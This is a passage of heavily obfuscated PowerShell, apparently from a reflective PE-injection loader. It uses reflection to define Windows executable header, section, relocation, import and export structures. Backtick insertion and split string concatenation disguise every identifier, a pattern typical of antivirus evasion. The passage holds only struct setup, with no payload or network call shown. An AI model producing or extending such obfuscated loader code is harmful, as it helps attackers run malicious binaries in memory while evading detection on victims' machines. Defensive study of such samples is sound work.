${Nu`Ll}   =   (${T`B}."deF`INeFiE`LD"( 'S'+  'i'  + 'z'+'e'+  'O'  +'f' +  'I'  + 'n'  + 'i'  +  't'  + 'i' + 'a'  +  'l' +'i'  + 'z'  + 'e' + 'd'+'D' + 'a'  +  't' + 'a', [UInt32], (  'P'+'u'+'blic')  ) )."se`TOF`FsET"(  8  )
${n`UlL}   =  (  ${Tb}."DeFiNe`FI`eLD"( 'S' +'i' +'z'  +'e'+  'O'+'f'+'U' + 'n'+  'i'  +'n' +'i'+  't'  +'i'  +'a'+'l'  +  'i'  +'z'  +'e'  + 'd'  + 'D'+ 'a' +  't'  +  'a', [UInt32], ( 'Pu'  + 'bli'+'c' )))."setOfF`S`ET"(  12  )
${N`Ull}  = (  ${Tb}."De`F`I`NEfiELd"( 'A'  +  'd' +'d' +  'r'+  'e'  + 's' +  's' +'O' +  'f'  + 'E'+  'n' + 't'  +  'r'+  'y' + 'P'  +  'o' +'i' + 'n'  +'t', [UInt32], ('Pu' +  'bl' + 'ic') ))."sEto`FF`sET"( 16 )
${n`UlL} = (${tb}."dE`Finef`ielD"('B'  +'a'+  's' +  'e'+  'O'+'f'  +'C' +  'o'  +  'd'+ 'e', [UInt32], (  'Pub'  +'li'+'c')))."Set`offS`et"(  20)
${n`Ull}   = (  ${t`B}."D`EfI`N`eFIEld"(  'B'  +'a'+  's'  + 'e' +  'O'  +  'f'+  'D'  +  'a'+'t' +  'a', [UInt32], ('Pu' + 'blic'  ))  )."se`TOF`FsET"(24 )
${nu`Ll} =   (${TB}."DEfINEf`i`ELD"(  'I'+ 'm' +'a'  +  'g'+  'e'+'B'+  'a' +'s' +  'e', [UInt32], (  'P'+'ub'  +'lic' ))  )."seT`O`F`FSET"(28  )
${n`UlL} = ( ${tb}."D`E`FinEfie`Ld"(  'S'  + 'e' +  'c'+  't' + 'i'  +  'o'+  'n'+  'A'+ 'l'  +'i'  +'g'+ 'n'+  'm'+  'e'  + 'n'  + 't', [UInt32], ('P'+'ubli'+'c'  )  ))."SetOF`Fs`et"( 32)
${NU`Ll}   =  (  ${t`B}."Def`I`NEfielD"( 'F'  +  'i'  +'l'  +'e'  + 'A'  + 'l' + 'i'  +'g' +'n'  +'m'  + 'e'  +  'n'  +'t', [UInt32], (  'Pub'  +  'lic'  )))."SeToFf`sET"(36)
${N`ULl}   =  (  ${Tb}."deFIne`FiE`LD"( 'M'  +  'a'+  'j'+ 'o' +  'r'  +  'O' + 'p' +'e'+'r'+  'a'+  't' +  'i' +'n' +'g'  +  'S'+  'y' +  's'+'t'  +'e' + 'm' +  'V'  + 'e' + 'r' +'s'+ 'i'+'o' +'n', [UInt16], ('Pu'  + 'blic'  ) )  )."sE`T`OFFset"(40 )
${nu`ll}   = ( ${T`B}."de`FINEfIe`Ld"('M'+'i'+'n'+'o'  +  'r' +'O'+  'p'  +'e' + 'r'  +'a'  +  't'  +'i' +  'n' +'g'+'S'+'y' +  's'  +'t'  +  'e'+'m'  +'V'  +'e'+  'r'+ 's'  +'i'  +'o'+'n', [UInt16], (  'Publi'+'c' )  ))."s`etOF`FsEt"(  42  )
${NU`lL}   = ( ${Tb}."D`eF`I`NEfIELD"( ( 'Ma'+  'j') +('o'+  'rI' )  + 'ma' +(  'g'+'eV') +  ('er'  + 's' ) +( 'io'  +'n'), [UInt16], ( 'Pu'+'blic')))."Se`To`FFsET"(44 )
${n`Ull} =   (  ${t`B}."D`EFin`Ef`ieLd"(('Mi'+ 'n')+ (  'o'+  'rI' )+'ma' +('g'  + 'eV')  +  ('er' +'s')  +(  'i'  +  'on' ), [UInt16], ('Publi'+ 'c'  )) )."S`Et`offsET"( 46)
${nu`LL}   = (${TB}."d`EfiNeFiE`Ld"( ('M' + 'aj' )+ (  'o' + 'rS'  )+  'ub' +  (  'sy' + 's' )  + ( 't'+'em' )+'V'+ ('e' +'rs')+(  'io' +  'n'  ), [UInt16], (  'Publ' +'ic') )  )."se`TofFseT"(48)
${N`ULL} = (${t`B}."D`EFin`EFieLd"(  (  'Mi' +  'n' )+  ( 'or'+  'S' )  +  'ub' + ( 'sy'+  's')+ ('te' +  'm'  )  +  'V'  + ( 'e'  +'rs')+( 'i'  +  'on' ), [UInt16], ( 'Pu' +'b' +'lic' ) )  )."SE`T`OFfset"(50  )
${nU`lL}  =  ( ${tB}."de`FINEfiE`ld"(  ( 'W'+ 'in')+ '32' +( 'Ve' +'r')+  ('si' +  'o' ) + ( 'n' +'Va'  )+  (  'lu'  + 'e' ), [UInt32], ( 'Pu'  + 'blic')  ))."seTOf`FsEt"( 52 )
${N`Ull}   =  (${T`B}."DEFin`E`FiELd"(  (  'Si'+ 'z'  ) +('e'  +  'Of')  +('I'+  'ma')+  'ge', [UInt32], ( 'Pub' +  'l'+'ic'  ))  )."sE`To`FfSEt"(  56 )
${N`ULL} = ( ${TB}."def`In`e`FIElD"( ('S'  +  'iz') +  ( 'e'+'Of'  )  + (  'He'  +'a' )+('der' + 's'  ), [UInt32], ('Pu' + 'bl'+'ic'  ))  )."SEtO`Ff`Set"(  60 )
${n`Ull}   =   ( ${T`B}."def`iNE`FIELd"(  ( 'Ch' + 'e'  )+('ck'+'S')  +'um', [UInt32], (  'Pu' +'blic')  ) )."SET`oFf`sEt"( 64  )
${nu`lL}  = ( ${t`B}."De`FI`NEfI`eLD"((  'Su'  +  'b' )  + (  'sy' +  's'  ) +  (  'te'  +  'm' ), ${SU`Bs`Yste`MTy`PE}, ( 'P'  + 'ubl' + 'ic' )))."sE`ToFF`sEt"(  68  )
${nu`lL}   =  (${tB}."de`FInEf`Ie`LD"(  ( 'Dl' + 'l' ) +  (  'Ch'+ 'a' )+  ( 'ra' +'c'  ) +(  'te'  +  'r'  ) +  ('is'+  't') +  ('ic'+  's'), ${Lf`mm`MSG}, ('Publi'+'c' )  )  )."sEtofF`s`Et"(  70 )
${n`Ull}  =  (  ${Tb}."DEf`IN`EfIElD"( (  'S'+'iz' ) + ( 'e'  +'Of'  )+ (  'S'+  'ta')+ ( 'ck'  +'R' ) +('es'+  'e' )+  ('r'  +  've'  ), [UInt32], ('P'+'ublic' )  ) )."SeTof`Fs`eT"(  72)
${N`Ull} =   (  ${t`B}."D`e`FInE`FIelD"(  ('Si' +  'z'  )+('eO'  + 'f') + ('S'+'ta' ) +(  'c'  +'kC'  )+( 'o' +  'mm' ) +'it', [UInt32], ('P'  +'ubl' +  'ic' ))  )."seTof`F`set"( 76)
${N`UlL} =   (${T`B}."dEF`i`NeFIeLd"(  ( 'Si'  +  'z'  )+  (  'eO'+ 'f' ) +  ( 'H'+  'ea' )+ (  'pR'  + 'e'  )  +(  'se' +  'r')+'ve', [UInt32], (  'Publ'  +  'ic'  )  )  )."SetOf`FSEt"(80  )
${N`Ull} =   (  ${tb}."deFiNe`FI`ELD"(( 'S'  +'iz')  + ( 'e'  +'Of'  )+('H' +'ea')+ ('p' +'Co'  ) +  ( 'mm' +  'i' )+  't', [UInt32], ('Pub'+  'li'+'c')  ) )."s`e`TofFSET"(84  )
${N`Ull}   =  (${Tb}."DE`FINe`FIeLD"(  (  'Lo'+ 'a' )  +('d'  +  'er'  ) +(  'F' +  'la' )+'gs', [UInt32], ( 'Pub'+  'l'+  'ic') )  )."s`e`ToFfsEt"(88  )
${nU`LL} = (${t`B}."d`efINEf`iElD"(( 'N'  +  'um')  + ( 'b' +'er' )  +  ('Of'  +  'R')+ ( 'va' +'A'  ) + ('n'+ 'dS'  )+(  'iz'+'e' ) + 's', [UInt32], ('Pu' + 'b'  +  'lic'  )  ))."sE`T`ofFSeT"( 92 )
${nu`ll}   =  (${t`B}."deFI`Nefi`e`lD"( (  'Ex'  +'p'  )  +( 'o' + 'rt' )+ ( 'Ta'+  'b' )+'le', ${II`MG}, ('P'  + 'ubl' + 'ic'))  )."seT`OF`FSet"(  96  )
${nU`lL}   =   (  ${TB}."DE`FIne`FIELD"(  ( 'Im' + 'p') +  (  'o'+  'rt' )+('T' +  'ab')+  'le', ${iI`Mg}, ('Pu'+ 'bli'+  'c'  )  )  )."Seto`FFsEt"(104 )
${Nu`lL}   =   (${T`B}."DEF`I`Ne`FIeLD"(('R' + 'es'  ) + ('o' + 'ur' )+ ('ce'  +'T')  + ('ab' +'l' )+'e', ${i`iMG}, (  'P' +'ublic'  )  ))."s`EtO`FfSet"(112 )
${nU`ll} = (${tB}."D`eFineF`IELD"((  'E' +  'xc') +( 'ep'  +  't' ) + ( 'io' + 'n')+  ( 'Ta' + 'b') + 'le', ${Ii`mG}, (  'Pub'+'li'  +'c' ))  )."sEt`o`Ffset"(120 )
${Nu`ll}  =   (  ${t`B}."DEfiN`Ef`IelD"(  ( 'Ce'+ 'r') +( 'ti'+  'f'  )+ ('ic' +'a')  +('te' +  'T'  )+( 'a' +  'bl')+ 'e', ${II`mG}, ('Publi' + 'c' )  )  )."SE`T`oF`FSeT"( 128  )
${N`ULL}  = (${T`B}."d`EfI`N`EFIeLD"( ('Ba' +  's'  )+('e'+  'Re'  )  +( 'lo'+  'c') +(  'at'+  'i' )+ (  'on'  +  'T')+ (  'a'  + 'bl'  )+  'e', ${Ii`mG}, (  'P'+  'ublic'  )  ))."sE`ToF`FSEt"(  136)
${N`UlL}  = ( ${t`B}."D`EfINefie`LD"((  'De'+'b'  )+'ug', ${II`MG}, (  'Pu'  +'blic' ) ))."S`e`TOFfSet"(  144)
${Nu`lL}  = (${Tb}."DEFin`E`F`IElD"( ('Ar'+'c'  )+( 'h'+'it'  ) + ('e'+  'ct') +(  'u'  + 're'  ), ${iI`mG}, ( 'Publi'+ 'c')  ) )."SETO`F`FSEt"( 152)
${N`ULl} =  (  ${t`B}."d`eFINEf`iEld"( ('G'  +  'lo')+ ( 'b'+'al' )  + (  'P'  + 'tr' ), ${i`img}, ('P'+'u' +  'blic'  )  ))."S`EtOffSEt"( 160  )
${n`UlL}   = (  ${T`B}."de`FI`Ne`FieLD"(  (  'TL'+ 'S' )+ ('T'+  'ab' )+'le', ${I`IMg}, ('Pu'  +'b'+  'lic') ))."sEto`FfS`Et"(  168  )
${n`ULl}   = (  ${TB}."D`efI`NEf`Ield"(  ('Lo' + 'a'  ) +( 'dC' +'o'  )  +('n'+ 'fi' )  +( 'gT'+  'a'  )+  ('b' +  'le'  ), ${I`iMG}, (  'Publ'  +'i'  +'c'  )))."seTo`Ffs`et"(  176)
${n`Ull}  =   (  ${tb}."deF`iNeF`Ield"( ('Bo'+ 'u' ) +  ('nd'+'I'  )+ (  'm' +  'po'  ) + 'rt', ${Ii`mG}, ( 'P'  +  'ubli' +'c') ))."SeT`off`SeT"(  184 )
${Nu`Ll} =   (${t`B}."DEF`InEF`iEld"(  ( 'IA'+  'T'  ), ${i`IMg}, ('Pub'+ 'lic'  ))  )."SE`T`OffSET"(192 )
${n`Ull} = ( ${t`B}."d`EfiNeFIe`Ld"(  ( 'De'+  'l'  )+ ('a' +  'yI') +  ('mp'+ 'o'  )  +  ('r'+'tD')+ ( 'es'  +  'c'  ) + (  'ri' + 'p')+ ('t'+ 'or'), ${i`iMg}, ( 'Pu' + 'blic'  )) )."S`etof`F`seT"( 200)
${Nu`LL} =   (${t`B}."dEfiN`EF`i`Eld"(  ( 'C'+ 'LR') + ( 'Ru'  + 'n'  )+ (  'ti' +  'me')  +  ('H'+  'ea'  )+(  'de' + 'r' ), ${I`IMg}, (  'Pu' +'bli'  +'c'  ) )  )."sEtO`FFs`et"( 208)
${N`Ull}  =  (${tB}."D`EfiNe`FIElD"(  (  'R'+ 'es' ) +('e'+'rv'  )  +  'ed', ${i`imG}, (  'Pu'  +  'blic' )  ))."SE`ToffSet"(216 )

${a`Tr} =  $(('Au'  + 'to')+( 'L'  +'ay'  ) +(  'ou' +'t'  )  + ', '+ (  'Ans'+  'i'  ) +(  'Cl' +  'a' )+  'ss' +  ', ' +  ( 'Cla'+  's' ) +'s'+ ', ' + ('P'  +  'ub')  +  (  'li'+ 'c'  )+', '+ (  'S' +  'eq' ) +  (  'u'+ 'en'  )+('t'  +  'ial')  + ( 'L' +'ay' )+( 'o'+'ut'  )  +', '  + (  'Se'+  'a') +('le'+ 'd' )  +', '  +  ('B' +'ef') +  ('o'  + 're' ) +(  'F' +'ie'  ) +(  'l'  +'dI' )+ ('n' +  'it'  )  )
${Jfn`ys}  = ${t`B}."cRe`AT`ETYPE"( )
${w3`2T}  |   aM -MemberType $('No' +  'te'+  'P'+ 'r'  +'op'+'e'+'r'  + 'ty'  ) -Name $('IM'+ 'AG'  + 'E_' + 'OP' +  (  'T' +'IO' )  +  'NA' +  'L_'  +'HE'  + 'AD'+  ( 'ER3'  +'2'  )  ) -Value ${j`FN`Ys}


${tb}   = ${M`BeR}."D`efiN`eType"( (  'I'  +  'MA' )  + ( 'GE'  +'_' )+  (  'NT' + '_')  +  ('HE' + 'A' )  + (  'DE' +  'R' )  + ('S'+  '64' ), ${a`TR}, [System.ValueType], 264  )
${NU`lL} =  ${tB}."dEfi`NE`FIe`ld"(('Si'  +  'g' ) +( 'na'  + 't'  )+( 'u'+'re'  ), [UInt32], (  'P' +'ublic' ) )
${Nu`Ll} =  ${T`B}."defIN`e`FIElD"( (  'F' + 'il'  )  +  ( 'eH'  +'e'  )  + ('ad'+  'e' ) + 'r', ${P`El`XV}, (  'Publ'  + 'ic'  ))
${Nu`ll}   = ${tb}."dE`Fin`eFiElD"(  ( 'O'+ 'pt'  ) +(  'i'+'on'  )+('al'+ 'H'  )+ (  'e'+ 'ad')+ 'er', ${iI`Im`Bc}, ('Pu'+ 'blic' )  )
${l`ELCJs} = ${TB}."C`Rea`TE`TypE"(  )
${w`32T}  |  aM -MemberType $('No' + 'te'+  'P'+ 'r' +'op' +  'e' +'r' +  'ty' ) -Name $('IM' +'AG'  +  'E_'  + 'NT' +'_'+  'HE' + 'AD' +'ER'+('S6' + '4' )) -Value ${L`elcjs}

${tb}   =  ${M`Ber}."d`eFi`NEtYPE"(( 'IM'  +'A')  + (  'G'+ 'E_'  )+  (  'NT'+  '_')+ ( 'HE'  +  'A')  +(  'DE'  +  'RS')+'32', ${A`TR}, [System.ValueType], 248 )
${n`ULl} =  ${TB}."D`e`FinefiEld"(( 'S'+'ig' ) + 'na' +  ('tu'+'r'  )  + 'e', [UInt32], ( 'Publ'  + 'ic' )  )
${n`ULl}   = ${TB}."D`eF`iNeFieLD"(  ('F' +  'il'  )  + ('eH'+'e' )+'ad'+'er', ${pE`lxv}, (  'P' +  'ubli'+'c')  )
${n`ULl}   =   ${tB}."D`EfinEF`ieLD"(  (  'O'  +  'pt') +(  'i'  +  'on'  ) +  ( 'a' +'lH' ) + (  'e'  +  'ad')  + 'er', ${Jf`NyS}, ('P' +  'ubl' +'ic'  )  )
${P`PpAd}   = ${T`B}."cR`eatEty`PE"()
${W`32T} | aM -MemberType $('No' + 'te'+'P'+'r'+  'op'+'e'+ 'r'+ 'ty'  ) -Name $('IM'+  'AG'+  'E_'  +'NT' + '_'  +  'HE' +'AD'  + 'ER'+  ('S3' + '2' )) -Value ${p`P`pAd}


			
${A`Tr}   =  $((  'Au'+ 't' )+(  'oL'+ 'a' )  + (  'yo'+  'u' )+  't' +  ', '+'An'+ ('s'  +'iC'  ) +( 'la'  +  's'  )  +  's'  +  ', '+(  'C'  +'la' )+  'ss'  +', '  +( 'P'+  'ub'  )  +  ( 'li'+  'c' )  + ', '  +( 'Se' +'q'  ) +(  'u'+'en'  )+ ( 'ti' + 'a' )+  ( 'lL'+  'a') +('yo' + 'u')  + 't'+', '+ (  'Se'  + 'a')+ (  'l'  +  'ed')  +  ', ' + ('Be'  + 'f')  +  ( 'or'+'e')+(  'F' +'ie'  )+  ( 'l'  +'dI' ) + ( 'ni' + 't'))


${w3`2t}  | ForEach-Object {
${T`B}  =   ${M`BEr}."DE`Fi`NEtyPe"(('I' +  'MA')  +  (  'GE'  +'_'  )  + ( 'DO'  +'S' )+ ('_H'+ 'EA')  +  ( 'D' +'ER'  ), ${a`Tr}, [System.ValueType], 64)

${n`ULL}  = ${T`B}."definE`F`IeLd"('e_'+ ('m' + 'ag')  + 'ic', [UInt16], ('P'  +  'u'  + 'blic' ))
${nu`LL} =  ${Tb}."dE`F`iNEf`IelD"('e_'  +  'cb' +'lp', [UInt16], ('Publi' +  'c'))
${N`ULL} =  ${T`B}."dEfI`NE`Fi`eLd"('e_'  +'cp', [UInt16], (  'P'  +  'ub' +'lic'  ) )
${N`UlL}   =   ${t`B}."de`Fi`Ne`FielD"('e_' + 'cr' +  'lc', [UInt16], ( 'Pu'  +'b'  +'lic' ) )
${N`ULl}  =   ${Tb}."DEFI`NE`FiEld"('e_'+ 'cp' + 'ar' + ('hd'+'r' ), [UInt16], ( 'P'+'ubli'  + 'c')  )
${N`ULl}   =  ${T`B}."dE`FINEF`IEld"( 'e_'+ 'mi'  + 'na' +  ('l'  + 'lo')  +  'c', [UInt16], ( 'P'  +  'ublic'  ))
${n`Ull}   =  ${t`B}."dE`FIN`Ef`IEld"( 'e_'+  'ma' +  'xa'+(  'l' +  'lo' )+ 'c', [UInt16], ('Publ' +  'ic'  ))
${n`ULl} = ${t`B}."d`e`Fi`NeFiELD"( 'e_' +  'ss', [UInt16], ( 'P' +'ublic' )  )
${nU`lL}   = ${t`B}."DEFin`ef`iELD"( 'e_' +  'sp', [UInt16], ( 'Publ' +  'ic' )  )
${n`ULL} =  ${tB}."dEFInef`I`Eld"( 'e_' + 'cs' +'um', [UInt16], ( 'P'  +  'u' +  'blic'  )  )
${N`Ull} =  ${TB}."DEf`I`Nef`IeLd"( 'e_'  +  'ip', [UInt16], ( 'Publi' +'c'  ) )
${n`Ull}  =  ${T`B}."dEFi`N`E`FiELd"( 'e_'+'cs', [UInt16], ( 'Pub'  +'lic' ) )
${N`Ull} =   ${tb}."DEf`i`NEfIELD"( 'e_' +'lf'  + 'ar'  + 'lc', [UInt16], (  'Pub'  +  'lic' ) )
${NU`LL} = ${tb}."D`E`FIn`efIEld"(  'e_' + 'ov'  +  'no', [UInt16], ( 'P'  + 'ubl'  + 'ic'  ) )


    ${E_Re`SFie`LD}   =   ${t`B}."d`eF`I`NeFiEld"('e_'  + ( 'r'+'es' ), [UInt16[]], (  'P'+'ub' )  +  ( 'li'+  'c' ) +', '  +  ( 'H' +'as' ) +( 'F'+'ie' )+('l'+  'dM'  )  +  ('ar' +'s'  )+  ( 'ha'  +  'l'  ) )
    ${Cv} = [System.Runtime.InteropServices.UnmanagedType]::"bY`VaLa`RrAY"
    ${F`A}   =  @([System.Runtime.InteropServices.MarshalAsAttribute]."gET`Fi`ELd"( 'Si'  +'ze'  +'Co' + ('ns'  + 't')  ))
    ${A`BS}  = nO syStEm.REFlEctiOn.EMIt.cUSTOmATtriBUTEBuildER(${C`I}, ${C`V}, ${fA}, @([Int32] 4))
    ${e_`Re`SF`iEld}."Set`CUSt`OMAt`T`Ri`ButE"( ${a`Bs}  )

    ${NU`Ll} = ${T`B}."D`E`FI`NEfIEld"(  ( 'e_o'+ 'em' +'id'  ), [UInt16], ( 'Pu' +'blic') )
    ${n`Ull}   =   ${tB}."de`FiNEF`ieLD"(('e_o'+ 'eminf'  +  'o'), [UInt16], (  'Pub'  +'lic')  )

    ${e`_Re`S2FI`elD}   =   ${Tb}."d`EFiNefi`Eld"(  'e_'+ ( 'res'+'2' ), [UInt16[]], (  'Pu'+ 'b' ) + ('l'  + 'ic'  )  +', '  + (  'H'  +  'as'  ) + ( 'Fi'  +'e' )  + (  'ld' + 'M'  ) +  ('ar'+  's') +('h'+ 'al' ) )
    ${Cv}  =  [System.Runtime.InteropServices.UnmanagedType]::"bYv`ALA`RR`AY"
    ${a`BS}  = nO sYsteM.REfLecTIOn.EMit.CUsTOmATtRibuteBuILDer(${cI}, ${c`V}, ${F`A}, @([Int32] 10 )  )
    ${e_RE`S2`Fie`lD}."SEt`CU`stOMaTT`RiBu`Te"(  ${a`BS})

    ${nU`LL}   = ${tB}."D`E`FINEfiELd"( 'e_' +('lf'+'a'  )  +(  'ne' +  'w'  ), [Int32], ('Pu'  + 'b'  ) + (  'l' + 'ic' )  )
    ${I`D`oSA}   =  ${tB}."cr`E`AtE`TYPe"( )    
    ${_} |   aM -MemberType $('No'+'te'  + 'P'  +  'r'+  'op'+'e'+  'r'+'ty'  ) -Name $('IM'  +  'AG' + 'E_' +  'DO'+ 'S_'  + 'HE'+'AD' + 'ER' ) -Value ${IdO`SA}
}


			
${a`TR}   = $(('A'+  'ut'  )  +( 'o'  + 'La' )  +  (  'you'  + 't' )+ ', '  + (  'An'  +  'si'  )+ ('Cl'+'a'  ) +  'ss' + ', ' + (  'C' +'la' ) + 'ss'+  ', ' +  ( 'P'+  'ub'  ) +(  'li'+'c') + ', ' + (  'S'  +'eq' ) +  (  'ue' + 'n' ) +( 't'  +  'ial' )  +( 'L'+'ay')  +( 'ou'+ 't' ) + ', '+('Se' +  'a'  ) + ('l' +'ed' )+', '+(  'B'+ 'ef')  +('o' +'re'  )  + ('F'  + 'ie' )+ ('ld'+'I') +(  'ni'+ 't' )  )

${W3`2T} | ForEach-Object {
    ${T`B}   =  ${m`BeR}."deF`i`NeTYPE"( ( 'IM'  + 'A'  )  + (  'GE'  +'_'  )  +(  'S'+ 'EC') +( 'TI' + 'ON')  +('_H'+'EA'  )  +('D'  +'ER'), ${A`Tr}, [System.ValueType], 40 )

    ${n`A`MEFielD} = ${T`B}."deFin`eFIe`ld"('Na'  +'me', [Char[]], ('P'  + 'ub') +  (  'li'  + 'c')+ ', ' +( 'Ha' +'s'  ) + (  'Fi'+  'e'  )+  ( 'l'  +'dM' ) +  (  'a'  +'rs' ) +('h'+  'al'  ) )
    ${nAMeF`ie`ld}."SeTc`UsTOmAtTR`ib`U`Te"(  
        ( nO SYStem.REFLECTioN.EMIt.cuStomaTtRIBUteBuIldEr(
            ${c`I},
            [System.Runtime.InteropServices.UnmanagedType]::"bYVala`RR`AY",
            ${Fa},
            @([Int32] 8)
          ) )
     )

${NU`Ll}   =  ${T`B}."DefiNEF`I`ELd"( ( 'V' + 'ir')  +( 'tu'+  'a' )  + ( 'lS'  +'i')+'ze', [UInt32], ('P'  +  'ub'  )+('l'  +  'ic'  )  )
${N`ULL}  = ${T`B}."dEfiNEF`Ie`lD"( ( 'V'  +  'ir' )+ ( 'tu' +'a')+('l'+ 'Ad' )+ (  'd' +  're') +'ss', [UInt32], ('Pu' +'b') + ('l'+ 'ic') )
${nU`lL}   =   ${t`B}."dEF`InEFie`LD"(  'Si' +  (  'z' +'eO' ) +  (  'fR'+  'a'  )+( 'wD'  +'a' )  +'ta', [UInt32], ('Pu'  +'b'  )+(  'l'+'ic'  )  )
${n`ULL}   = ${Tb}."dEfInE`FI`E`LD"(('Po'  + 'i')  +  ('nt' + 'e' )+  (  'r'  +'To' ) +'Ra' +  (  'wD' + 'a'  ) +  'ta', [UInt32], ('P'+ 'ub' )+( 'l'+  'ic'))
${Nu`Ll} =   ${tb}."De`FIN`E`FIeld"( ('Po'  +'i'  )  +  ('n'+ 'te'  )+ ( 'rT' +  'o') +(  'Re'+ 'l' ) + ('o'  +  'ca')  + ('t'+ 'io' ) +  'ns', [UInt32], ( 'P'  +'ub'  )+  ('l' +  'ic'  ) )
${Nu`ll}  =   ${T`B}."d`e`FIn`EfIeld"(  ('P'  +  'oi' )  +  ( 'nt'  + 'e')  + (  'rT'+ 'o'  )+( 'Li'+'n'  )+('e'+ 'nu')+(  'm'+ 'be') +  'rs', [UInt32], ( 'Pu'  + 'b'  )+  ( 'l' +'ic')  )
${n`ULL}   =   ${t`B}."D`efi`NeFie`LD"( ( 'N'  +'um')  +  ('be' +'r') +  ('Of'  +  'R') +  ('el'  +  'o')+(  'ca' + 't'  )  +(  'io'+'n' ) + 's', [UInt16], ('P' +  'ub')+ ( 'li'+'c' ) )
${N`ULL}   = ${t`B}."dEFinE`Fi`eLD"(  ( 'N'+ 'um') +  ( 'b'+  'er'  )  + ('Of'  + 'L' )  +('i'  +  'ne' )+ ( 'nu'  +  'm'  )+  ('be' +  'r' )+  's', [UInt16], ( 'P'  +  'ub')+( 'l'+ 'ic')  )
${n`ULl} =   ${TB}."d`E`F`INEfielD"(( 'Ch'  + 'a')  + ('r'+ 'ac')+ ('te'  +'r'  )  + ('i'+'st'  ) + (  'ic'+  's'), [UInt32], (  'Pu' +  'b'  )  +  ('l' + 'ic'  ) )
    ${P`eLCM}   =   ${t`B}."CREAT`Ety`pE"(  )
    ${_} |  aM -MemberType $('No'  +  'te'  +  'P'+'r'  + 'op' +  'e'+'r' +'ty') -Name $('IM'+ 'AG'+'E_'+ 'SE'+  'CT'  +  'IO' +'N_'  + 'HE'  +'AD' +  'ER'  ) -Value ${pe`LCM}

${tB}   =  ${mB`eR}."defI`N`eTYpE"( ( 'IM' +  'A' )+ ('G'  +  'E_') +  (  'BA'  + 'S' )+ (  'E_'  +  'R')+  (  'EL'+  'O')  + ( 'CA'+  'T' )+  (  'I'+'ON'  ), ${a`Tr}, [System.ValueType], 8)
${nu`Ll}   = ${tB}."d`EF`inefIeld"((  'V'+'ir')+  (  't'  +  'ua'  )  + (  'l'  + 'Ad' ) + ( 'dr'+'e'  ) +  'ss', [UInt32], ( 'Pu'  +'b'  )  +('l'+  'ic' )  )
${n`ULL}   = ${Tb}."de`F`InEfielD"((  'Si'+  'z')  +  (  'e'+'Of' ) +  ('Bl'  +  'o'  )+ 'ck', [UInt32], (  'P'  + 'ub'  )+('li'  +  'c') )
    ${MD`S`Bf} =  ${t`B}."C`R`EaTetype"(   )
    ${_}   |  aM -MemberType $('No' +  'te' + 'P'  +  'r'+'op'  +'e'  +  'r'+  'ty'  ) -Name $('IM'+ 'AG'  +  'E_'  +'BA' +('SE' +'_' )  + 'RE'  +'LO'  +'CA'+'TI'+ 'ON') -Value ${m`Ds`BF}

${t`B}  = ${m`Ber}."def`In`EType"( ('I' +'MA')+  ( 'GE'  + '_' )  + ( 'I' + 'MP')+ ( 'OR'  + 'T')  + ( '_' + 'DE' ) + (  'SC' +  'R'  ) +  (  'IP'  +  'T' ) + 'OR', ${A`TR}, [System.ValueType], 20  )
${Nu`Ll}   = ${Tb}."D`eF`INe`FIElD"( ( 'Ch'  +  'a'  ) +  (  'r'+'ac'  )+ ('t'  + 'er'  ) +  ('i' +  'st') +  (  'ic'  + 's'), [UInt32], ('Pu'+'b'  )  +  ( 'l' +'ic')  )
${n`UlL}  = ${tb}."de`Fi`Ne`FIElD"(( 'Ti'+'m'  )  +('e' +'Da' ) +(  'te'+  'S' ) +('t'+'am'  )+'p', [UInt32], (  'P'+  'ub'  )+ ('li'  + 'c') )
${n`UlL}   = ${T`B}."Def`i`NEfiE`lD"(('F'+  'or')  +(  'wa'+'r' ) +(  'de' +  'r'  )+( 'Ch' +'a' ) +'in', [UInt32], (  'Pu'+ 'b'  ) +( 'l'+'ic' ))
${N`Ull}   = ${Tb}."def`I`N`eFIEld"(('N' +'am'  ) +  'e', [UInt32], ('P'  + 'ub') +(  'l'  +'ic'  ))
${Nu`ll} =   ${T`B}."DeFiN`e`FiELD"( ( 'Fi'  +  'r' )+ ( 'st'+'T')  + ('h' +  'un'  ) +  'k', [UInt32], (  'Pu'+'b')+  (  'li'+'c'))

    ${i`ID_d}  =   ${t`B}."cR`EAt`e`Type"(  )
    ${_}  |  aM -MemberType $('No' + 'te'  + 'P' + 'r'+ 'op' +'e'  + 'r'  +'ty') -Name $('IM'  +  'AG'  +'E_'  + 'IM'+ 'PO'+  ( 'R'+'T_'  )  + 'DE' + 'SC'  +'RI'  +'PT' +  'OR'  ) -Value ${I`i`d_d}
}


			
${a`TR}  =   $((  'Au'+'t'  )+  (  'oL'+  'a' )  +(  'y'  + 'out')+', '  +( 'A'+'nsi'  ) +  ( 'C'  +'la' )+ 'ss'  + ', ' + ('C' +'la' )+  'ss' +  ', '  + ('P'  + 'ub'  )+  ('li'  + 'c'  ) + ', '+( 'S'+ 'eq'  )+ ('ue'  + 'n' )+  ('tia'+'l'  )+(  'La' + 'y'  )  + ('ou'+'t'  )+', '  +  (  'S'+ 'ea' )  + ('le'+  'd' )+ ', ' +  ( 'B' + 'ef' ) +('or' +'e' )  +( 'F'+  'ie'  )  + ( 'ld' +'I'  )  +  ( 'ni'+ 't' ))


${w`32T}  | ForEach-Object {
${T`B} =   ${m`Ber}."DeFI`NEt`ypE"( (  'IM'+  'A') + ( 'GE'+'_' )  +  ( 'EX' +'P') + ('O'  +'RT')+('_DI'+ 'R' )+ ( 'EC'+'T')  + (  'O' +  'RY' ), ${a`TR}, [System.ValueType], 40 )
${N`UlL}   =  ${Tb}."d`eFINeF`IELD"(('Ch' + 'a')+ ('r' +  'ac') +  ('te'  + 'r'  )  + ('is'+ 't' ) +(  'i' + 'cs'  ), [UInt32], (  'P' + 'ub')+ (  'l'  + 'ic' )  )
${Nu`Ll}   =  ${tb}."DEFi`NeF`i`ELD"((  'T'  +'im'  ) +  ( 'eD' +'a' )+(  't'+ 'eS')  + ( 'ta' +  'mp'  ), [UInt32], ('Pu'  +  'b'  )  +  ('li' +  'c')  )
${N`UlL} =   ${T`B}."D`EfiNe`FI`ELd"(  ('M'+ 'aj' )+ ('o'  +  'rV'  )+ ( 'e'  + 'rs')  +  ( 'io' + 'n' ), [UInt16], (  'Pu'+ 'b')  +(  'l' + 'ic' )  )
${NU`lL}   =  ${Tb}."dE`FiNef`iELD"( ( 'Mi'+'n')+  (  'o' +'rV')+  ( 'e'  +'rs' ) +('io' +  'n'  ), [UInt16], ('P'+ 'ub' )+ ( 'li'+ 'c' ))
${n`ULl} =   ${tb}."dE`FiN`EfIELd"(  (  'Na'  +  'm') + 'e', [UInt32], ( 'P'+  'ub' )  +(  'l' +  'ic'  ))
